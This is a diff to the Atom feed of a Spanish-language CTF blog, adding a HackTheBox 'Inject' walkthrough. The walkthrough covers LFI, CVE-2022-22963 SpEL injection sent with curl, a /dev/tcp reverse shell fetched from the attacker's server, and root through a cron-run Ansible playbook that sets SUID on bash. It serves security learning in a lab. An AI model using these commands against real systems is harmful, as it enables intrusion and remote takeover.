@@ -1,5 +1,473 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-01T16:45:58-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
-</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Cascade (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade.html" rel="alternate" type="text/html" title="HackTheBox - Cascade (medium)" /><published>2024-06-01T00:00:00-06:00</published><updated>2024-06-01T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade.html"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-06-02T15:24:28-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">MiguelRega7 - blog</title><subtitle>Posts sobre resolución de CTFs y ciberseguridad.
+</subtitle><author><name>MiguelRega7</name></author><entry><title type="html">HackTheBox - Inject (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html" rel="alternate" type="text/html" title="HackTheBox - Inject (easy)" /><published>2024-06-02T00:00:00-06:00</published><updated>2024-06-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html"><![CDATA[<p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/285ba8819710b6ae1f67bc0e5914ffd9.png" />
+</p>
+
+<ul>
+  <li>Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files on the system can be enumerated, revealing that the web application uses a specific version of the <code class="language-plaintext highlighter-rouge">Spring-Cloud-Function-Web</code> module susceptible to <code class="language-plaintext highlighter-rouge">CVE-2022-22963</code>. Exploiting this vulnerability grants an initial foothold as the <code class="language-plaintext highlighter-rouge">frank</code> user. Lateral movement is achieved by further file enumeration, which discloses a plaintext password for <code class="language-plaintext highlighter-rouge">phil</code>. A cronjob running on the machine can then be exploited to execute a malicious <code class="language-plaintext highlighter-rouge">Ansible</code> playbook, ultimately obtaining a reverse shell as the <code class="language-plaintext highlighter-rouge">root</code> user.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,8080 10.10.11.204 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-02 11:53 CST
+Nmap scan report <span class="k">for </span>10.10.11.204
+Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d <span class="o">(</span>ED25519<span class="o">)</span>
+8080/tcp open  nagios-nsca Nagios NSCA
+|_http-title: Home
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h2 id="enumeración-y-lfi">Enumeración y LFI</h2>
+
+<ul>
+  <li>Vemos las versiones que esta corriendo el servicio web que al parecer no son muchas.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Content</span><span class="o">-</span><span class="no">Language</span><span class="p">[</span><span class="n">en</span><span class="o">-</span><span class="no">US</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Frame</span><span class="p">,</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Home</span><span class="p">],</span> <span class="no">YouTube</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/1.png" />
+</p>
+
+<ul>
+  <li>En la parte de <strong>register</strong> no vemos nada importante.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/2.png" />
+</p>
+
+<ul>
+  <li>La parte de <strong>blogs</strong> funciona y vemos algunos usuarios.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/3.png" />
+</p>
+
+<ul>
+  <li>Sin embargo hay una ruta que se llama <strong>/upload</strong> la cual esta si funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/4.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Vamos a subir un archivo cualquiera en este caso un <code class="language-plaintext highlighter-rouge">.txt</code>.</p>
+  </li>
+  <li>
+    <p>Sin embargo aunque lo subamos nos da esta respuesta.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/5.png" />
+</p>
+
+<ul>
+  <li>Si probamos con una imagen funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/6.png" />
+</p>
+
+<ul>
+  <li>Podemos ver la imagen y la <code class="language-plaintext highlighter-rouge">url</code> es interesante.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/7.png" />
+</p>
+
+<ul>
+  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> al momento de abrir la imagen y si probamos un LFI vemos que funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/8.png" />
+</p>
+
+<ul>
+  <li>Hay 2 usuarios.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/9.png" />
+</p>
+
+<ul>
+  <li>Si vemos lo que hay dentro del directorio de <code class="language-plaintext highlighter-rouge">frank</code> encontramos esto.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/10.png" />
+</p>
+
+<ul>
+  <li>Aquí vemos una contraseña y un <code class="language-plaintext highlighter-rouge">.xml</code> con información.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/11.png" />
+</p>
+
+<blockquote>
+  <p>La contraseña no funciona para conectarnos por SSH.</p>
+</blockquote>
+
+<blockquote>
+  <p>El archivo de configuración que ha mostrado pertenece a Maven, que es una herramienta de gestión y comprensión de proyectos de software. Este archivo específico se usa para configurar ajustes relacionados con la construcción y gestión de proyectos en Maven By ChatGPT.</p>
+</blockquote>
+
+<ul>
+  <li>Vemos que ya nos hablan de <code class="language-plaintext highlighter-rouge">Java</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/12.png" />
+</p>
+
+<ul>
+  <li>Vemos un <code class="language-plaintext highlighter-rouge">WebApp</code> con archivos interesantes.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/13.png" />
+</p>
+
+<ul>
+  <li>Si le decimos a <code class="language-plaintext highlighter-rouge">ChatGPT</code> a que corresponden esos archivos nos dice que pertenecen a Maven.</li>
+</ul>
+
+<blockquote>
+  <p>La imagen que has proporcionado muestra una lista de archivos y directorios que son comunes en un proyecto de Java utilizando Maven como sistema de gestión y construcción de proyectos.</p>
+</blockquote>
+
+<h2 id="spring-cloud-function">Spring Cloud Function</h2>
+
+<ul>
+  <li>En el archivo <code class="language-plaintext highlighter-rouge">pom.xml</code> encontramos información incluye dependencias, propiedades del proyecto y configuraciones especificas de compilación.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/14.png" />
+</p>
+
+<ul>
+  <li>Nos da la versión que se esta utilizando para la biblioteca <code class="language-plaintext highlighter-rouge">spring-cloud-function-web</code> con versión <code class="language-plaintext highlighter-rouge">3.2.2</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/15.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Esta versión es vulnerable <a href="https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/">https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/</a>.</p>
+  </li>
+  <li>
+    <p>Aquí nos explican en que consiste y como se explota <a href="https://sysdig.com/blog/cve-2022-22963-spring-cloud/">https://sysdig.com/blog/cve-2022-22963-spring-cloud/</a>.</p>
+  </li>
+  <li>
+    <p>Al parecer aprovecha de <code class="language-plaintext highlighter-rouge">Runtime.getRuntime().exec()</code> que es un método en Java para ejecutar comandos.</p>
+  </li>
+  <li>
+    <p>Para ver si es vulnerable vamos hacer una petición con <code class="language-plaintext highlighter-rouge">curl</code>  a la ruta <code class="language-plaintext highlighter-rouge">functionRouter</code> lo que vamos hacer es crear un archivo en el directorio <code class="language-plaintext highlighter-rouge">/tmp</code>.</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/17.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 10.10.11.204:8080...
+<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
+<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.204:8080
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"touch /tmp/pwned"</span><span class="o">)</span>
+<span class="o">&gt;</span> Content-Length: 4
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:52:19 GMT
+&lt; Connection: close
+&lt;
+<span class="k">*</span> Closing connection
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:52:19.471+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>%                                   
+</code></pre></div></div>
+
+<ul>
+  <li>Si comprobamos desde el <strong>LFI</strong> vemos que efectivamente se creo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/16.png" />
+</p>
+
+<h2 id="shell-as-frank">Shell as frank</h2>
+
+<ul>
+  <li>Para obtener una <code class="language-plaintext highlighter-rouge">shell</code> vamos a crear un <code class="language-plaintext highlighter-rouge">.sh</code> que contenga una reverse <code class="language-plaintext highlighter-rouge">shell</code> y lo vamos a compartir mediante un servidor http con python3 para poder descargarlo en la maquina victima y hacer una petición al archivo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>reverse.php
+<span class="c">#!/bin/bash</span>
+bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
+➜  content python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos ponemos en escucha.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora subimos el archivo a la máquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 10.10.11.204:8080...
+<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
+<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.204:8080
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh"</span><span class="o">)</span>
+<span class="o">&gt;</span> Content-Length: 4
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:58:15 GMT
+&lt; Connection: close
+&lt;
+<span class="k">*</span> Closing connection
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:58:15.168+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora le damos permisos de ejecución.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 10.10.11.204:8080...
+<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
+<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.204:8080
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"chmod +x /tmp/reverse.sh"</span><span class="o">)</span>
+<span class="o">&gt;</span> Content-Length: 4
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 18:59:10 GMT
+&lt; Connection: close
+&lt;
+<span class="k">*</span> Closing connection
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:59:10.711+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y por ultimo lo ejecutamos para obtener <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
+Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
+<span class="k">*</span>   Trying 10.10.11.204:8080...
+<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
+<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
+<span class="o">&gt;</span> Host: 10.10.11.204:8080
+<span class="o">&gt;</span> User-Agent: curl/8.5.0
+<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
+<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"bash /tmp/reverse.sh"</span><span class="o">)</span>
+<span class="o">&gt;</span> Content-Length: 4
+<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
+<span class="o">&gt;</span>
+&lt; HTTP/1.1 500
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Date: Sun, 02 Jun 2024 19:00:11 GMT
+&lt; Connection: close
+&lt;
+<span class="k">*</span> Closing connection
+<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T19:00:11.233+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.204] 42862
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>827<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+frank@inject:/<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>frank
+frank@inject:/<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-phil">Shell as phil</h2>
+
+<ul>
+  <li>Si recordamos tenemos la contraseña de <strong>phil</strong> de primeras no pudimos conectarnos por <code class="language-plaintext highlighter-rouge">ssh</code> pero si podemos migrar a ese usuario desde la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span><span class="nb">cat </span>settings.xml
+&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
+&lt;settings <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0"</span> xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
+        xsi:schemaLocation<span class="o">=</span><span class="s2">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span><span class="o">&gt;</span>
+  &lt;servers&gt;
+    &lt;server&gt;
+      &lt;<span class="nb">id</span><span class="o">&gt;</span>Inject&lt;/id&gt;
+      &lt;username&gt;phil&lt;/username&gt;
+      &lt;password&gt;DocPhillovestoInject123&lt;/password&gt;
+      &lt;privateKey&gt;<span class="k">${</span><span class="nv">user</span><span class="p">.home</span><span class="k">}</span>/.ssh/id_dsa&lt;/privateKey&gt;
+      &lt;filePermissions&gt;660&lt;/filePermissions&gt;
+      &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt;
+      &lt;configuration&gt;&lt;/configuration&gt;
+    &lt;/server&gt;
+  &lt;/servers&gt;
+&lt;/settings&gt;
+frank@inject:~/.m2<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Funciona.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>frank@inject:~/.m2<span class="nv">$ </span>su phil
+Password:
+phil@inject:/home/frank/.m2<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
+phil@inject:/home/frank/.m2<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<ul>
+  <li>Podemos ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+8dc5c8c4c03735847448fbf460738832
+phil@inject:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<ul>
+  <li>Al no encontrar nada interesante decidí ejecutar <code class="language-plaintext highlighter-rouge">pspy64</code> para ver tareas <code class="language-plaintext highlighter-rouge">cron</code> y encontré esta, corre <code class="language-plaintext highlighter-rouge">ansible-parallel</code> <a href="https://pypi.org/project/ansible-parallel/">https://pypi.org/project/ansible-parallel/</a>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/easy/inject/escalada.png" />
+</p>
+
+<ul>
+  <li>Allí vemos la estructura del <code class="language-plaintext highlighter-rouge">.yml</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">cd </span>tasks/
+phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls
+</span>playbook_1.yml
+phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_1.yml
+- hosts: localhost
+  tasks:
+  - name: Checking webapp service
+    ansible.builtin.systemd:
+      name: webapp
+      enabled: <span class="nb">yes
+      </span>state: started
+phil@inject:/opt/automation/tasks<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que el directorio <code class="language-plaintext highlighter-rouge">tasks</code> corresponde al grupo staff y nosotros estamos allí y podemos escribir.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>phil<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>
+phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cd</span> ..
+phil@inject:/opt/automation<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+drwxrwxr-x 2 root staff 4096 Jun  2 19:26 tasks
+</code></pre></div></div>
+
+<ul>
+  <li>Como es una tarea cron lo que vamos hacer es asignarle privilegios <code class="language-plaintext highlighter-rouge">SUID</code> ala <code class="language-plaintext highlighter-rouge">bash</code> usando el modulo <code class="language-plaintext highlighter-rouge">ansible.builtin.shell</code> <a href="https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html">https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">cat </span>playbook_2.yml
+- hosts: localhost
+  tasks:
+    - name: SUID
+      ansible.builtin.shell: |
+        <span class="nb">chmod</span> +s /bin/bash
+      become: <span class="nb">true
+</span>phil@inject:/opt/automation/tasks<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a esperar a que se ejecute la tarea y ver si las <code class="language-plaintext highlighter-rouge">bash</code> se le otorga el privilegio <code class="language-plaintext highlighter-rouge">SUID</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/bash
+<span class="nt">-rwsr-sr-x</span> 1 root root 1183448 Apr 18  2022 /bin/bash
+phil@inject:/opt/automation/tasks<span class="err">$</span>
+</code></pre></div></div>
+
+<h2 id="shell-as-root">Shell as root</h2>
+
+<ul>
+  <li>Ahora ya estamos como <code class="language-plaintext highlighter-rouge">root</code> y vemos la <code class="language-plaintext highlighter-rouge">flag</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>phil@inject:/opt/automation/tasks<span class="nv">$ </span>bash <span class="nt">-p</span>
+bash-5.0# <span class="nb">whoami
+</span>root
+bash-5.0# <span class="nb">cat</span> /root/root.txt
+5a756880b37d955eee4996c9ef8a0620
+bash-5.0#
+</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/easy" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Cascade (medium)</title><link href="http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade.html" rel="alternate" type="text/html" title="HackTheBox - Cascade (medium)" /><published>2024-06-01T00:00:00-06:00</published><updated>2024-06-01T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/medium/2024/06/01/cascade.html"><![CDATA[<p align="center">
 <img src="https://labs.hackthebox.com/storage/avatars/64fef851357b8de1c4834093bf3426f2.png" />
 </p>
 
@@ -10414,570 +10882,4 @@ We will probably have to backup &amp; restore things later.
 - Mike.
 
 PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)
-</span></code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/hard" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Active (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html" rel="alternate" type="text/html" title="HackTheBox - Active (easy)" /><published>2024-04-15T00:00:00-06:00</published><updated>2024-04-15T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/04/15/active</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/04/15/active.html"><![CDATA[<p align="center">
-<img src="https://labs.hackthebox.com/storage/avatars/5837ac5e28291146a9f2a8a015540c28.png" />
-</p>
